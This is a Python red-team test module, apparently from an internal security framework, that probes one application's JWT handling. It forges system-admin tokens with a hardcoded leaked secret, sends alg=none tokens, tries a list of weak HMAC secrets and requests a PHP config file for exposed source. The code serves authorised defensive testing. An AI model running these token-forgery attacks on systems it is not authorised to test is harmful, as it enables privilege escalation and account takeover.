"""JWT secret extraction and forgery — NIST SP 800-171 Control 3.13.10.

Tests whether the JWT signing secret can be guessed, extracted from
source code, or bypassed via algorithm manipulation.
"""

import base64
import json
import time
import uuid

import jwt as pyjwt

from redteam.base import Attack, AttackResult, Severity, Status


class JWTSecretExtractionAttack(Attack):
    name = "api.jwt_secret_extraction"
    category = "api"
    severity = Severity.CRITICAL
    description = (
        "NIST 3.13.10 — Verify JWT signing secrets are strong, rotated, "
        "and not extractable from application source"
    )

    # The old hardcoded secret from the initial codebase
    KNOWN_SECRET = "eqmon_jwt_secret_2026_artemis_integration"

    WEAK_SECRETS = [
        "secret",
        "password",
        "key",
        "jwt_secret",
        "changeme",
        "eqmon",
        "eqmon_secret",
        "test",
        "123456",
    ]

    def _make_payload(self, **overrides) -> dict:
        payload = {
            "iat": int(time.time()),
            "exp": int(time.time()) + 86400,
            "user_id": f"redteam-jwt-{uuid.uuid4().hex[:8]}",
            "instance_id": "default",
            "email": "redteam-jwt-forge@example.com",
            "role": "system-admin",
            "opco_id": None,
            "vessel_id": None,
            "salt_version": 1,
            "auth_source": "eqmon",
        }
        payload.update(overrides)
        return payload

    async def execute(self, client) -> list[AttackResult]:
        results = []
        test_path = "/api/ai_chat.php"
        test_params = {"session_id": f"redteam-jwt-{uuid.uuid4().hex[:8]}"}

        # ----------------------------------------------------------------
        # 1. Forge JWT with old hardcoded secret
        # ----------------------------------------------------------------
        payload = self._make_payload()
        forged_token = pyjwt.encode(payload, self.KNOWN_SECRET, algorithm="HS256")

        status_code, body, headers = await client.get(
            test_path,
            params=test_params,
            cookies={"eqmon_session": forged_token},
        )

        if status_code == 200:
            forge_status = Status.VULNERABLE
            detail = (
                f"JWT forged with known secret '{self.KNOWN_SECRET}' was accepted (200). "
                "The hardcoded secret has not been rotated. Full system compromise possible."
            )
        elif status_code == 401:
            forge_status = Status.DEFENDED
            detail = (
                f"JWT forged with old hardcoded secret was rejected (401). "
                "Secret has been rotated."
            )
        else:
            forge_status = Status.PARTIAL
            detail = f"Forged JWT returned unexpected status {status_code}."

        results.append(self._make_result(
            variant="known_secret_forge",
            status=forge_status,
            severity=Severity.CRITICAL,
            evidence=f"Status: {status_code}, Secret: {self.KNOWN_SECRET}, Body: {body[:200]}",
            details=detail,
            request={"secret": self.KNOWN_SECRET, "token_claims": "system-admin"},
            response={"status": status_code, "body": body[:200]},
        ))

        # ----------------------------------------------------------------
        # 2. JWT with alg=none (algorithm bypass)
        # ----------------------------------------------------------------
        try:
            none_token = pyjwt.encode(self._make_payload(), "", algorithm="none")
        except Exception:
            # Manual construction if PyJWT refuses alg=none
            header_b64 = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(self._make_payload()).encode()
            ).rstrip(b"=").decode()
            none_token = f"{header_b64}.{payload_b64}."

        status_code, body, headers = await client.get(
            test_path,
            params=test_params,
            cookies={"eqmon_session": none_token},
        )

        if status_code == 200:
            none_status = Status.VULNERABLE
            detail = (
                "JWT with alg=none was accepted (200). "
                "Server does not enforce algorithm verification — critical vulnerability."
            )
        elif status_code == 401:
            none_status = Status.DEFENDED
            detail = "JWT with alg=none was correctly rejected (401)."
        else:
            none_status = Status.PARTIAL
            detail = f"JWT with alg=none returned unexpected status {status_code}."

        results.append(self._make_result(
            variant="jwt_none_algorithm",
            status=none_status,
            severity=Severity.CRITICAL,
            evidence=f"Status: {status_code}, Body: {body[:200]}",
            details=detail,
            request={"algorithm": "none"},
            response={"status": status_code},
        ))

        # ----------------------------------------------------------------
        # 3. JWT with weak/common secrets
        # ----------------------------------------------------------------
        accepted_secrets = []
        for weak_secret in self.WEAK_SECRETS:
            weak_token = pyjwt.encode(
                self._make_payload(), weak_secret, algorithm="HS256"
            )
            status_code, body, headers = await client.get(
                test_path,
                params=test_params,
                cookies={"eqmon_session": weak_token},
            )
            if status_code == 200:
                accepted_secrets.append(weak_secret)

        if accepted_secrets:
            weak_status = Status.VULNERABLE
            detail = (
                f"JWT signed with weak secret(s) accepted: {accepted_secrets}. "
                "Signing secret is trivially guessable."
            )
        else:
            weak_status = Status.DEFENDED
            detail = f"All {len(self.WEAK_SECRETS)} weak secrets were rejected."

        results.append(self._make_result(
            variant="jwt_weak_hmac",
            status=weak_status,
            severity=Severity.CRITICAL,
            evidence=f"Tested {len(self.WEAK_SECRETS)} weak secrets. Accepted: {accepted_secrets}",
            details=detail,
            request={"weak_secrets_tested": len(self.WEAK_SECRETS)},
            response={"accepted_secrets": accepted_secrets},
        ))

        # ----------------------------------------------------------------
        # 4. Source code exposure — attempt to read jwt-config.php
        # ----------------------------------------------------------------
        status_code, body, headers = await client.get(
            "/lib/jwt-config.php",
            cookies={},
        )

        # If PHP source is returned as text (not executed), the secret is exposed
        source_exposed = "<?php" in body or "JWT_SECRET" in body or self.KNOWN_SECRET in body
        if source_exposed:
            src_status = Status.VULNERABLE
            detail = (
                f"GET /lib/jwt-config.php returned PHP source code (status {status_code}). "
                "JWT secret is readable from the web."
            )
        elif status_code in (403, 404):
            src_status = Status.DEFENDED
            detail = f"GET /lib/jwt-config.php returned {status_code} — file not accessible."
        elif status_code == 200 and not source_exposed:
            src_status = Status.DEFENDED
            detail = (
                f"GET /lib/jwt-config.php returned 200 but no PHP source visible. "
                "PHP is being executed server-side (not exposing source)."
            )
        else:
            src_status = Status.PARTIAL
            detail = f"GET /lib/jwt-config.php returned {status_code}."

        results.append(self._make_result(
            variant="source_code_exposure",
            status=src_status,
            severity=Severity.CRITICAL if source_exposed else Severity.HIGH,
            evidence=f"Status: {status_code}, Source exposed: {source_exposed}, Body: {body[:300]}",
            details=detail,
            request={"path": "/lib/jwt-config.php"},
            response={"status": status_code, "source_exposed": source_exposed},
        ))

        return results
